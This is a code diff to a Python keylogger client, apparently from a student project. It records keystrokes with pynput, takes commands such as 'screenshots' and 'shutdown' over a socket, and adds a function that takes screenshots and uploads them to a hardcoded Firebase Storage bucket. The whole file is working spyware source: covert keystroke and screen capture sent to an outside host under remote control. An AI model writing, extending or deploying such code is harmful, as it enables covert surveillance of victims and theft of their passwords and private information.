@@ -1,9 +1,12 @@
 from pynput.keyboard import Listener
 import socket
-import imutils
 import pyautogui
 from datetime import datetime
 import os
+from firebase_admin import credentials, storage
+cred = credentials.Certificate("credentials.json")
+firebase_admin.initialize_app(cred, {"storageBucket": "pbl4-09092003.appspot.com"})
+
 
 clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -27,11 +30,22 @@ def on_press(key):
     except Exception as e:
         print("Error: " + str(e))
 
+def takeScreenshot():
+    now = datetime.now()
+    nameScreen = now.strftime("%Y%m%d-%H%M%S") + ".png"
+    screenshot = pyautogui.screenshot()
+    screenshot.save(nameScreen)
+
+    # Lưu ảnh vào Firebase Storage
+    bucket = storage.bucket()
+    blob = bucket.blob(nameScreen)
+    blob.upload_from_filename(nameScreen)
 # Start keylogger immediately upon connection
 with Listener(on_press=on_press) as parent:
     try:
         while True:
             message = clientSocket.recv(1024).decode('utf-8')
+            print("Message:" + message)
             if message == 'screenshots':
                 takeScreenshot()
             elif message == 'shutdown':
@@ -43,5 +57,3 @@ with Listener(on_press=on_press) as parent:
     finally:
         parent.stop()
         parent.join()
-        
-        
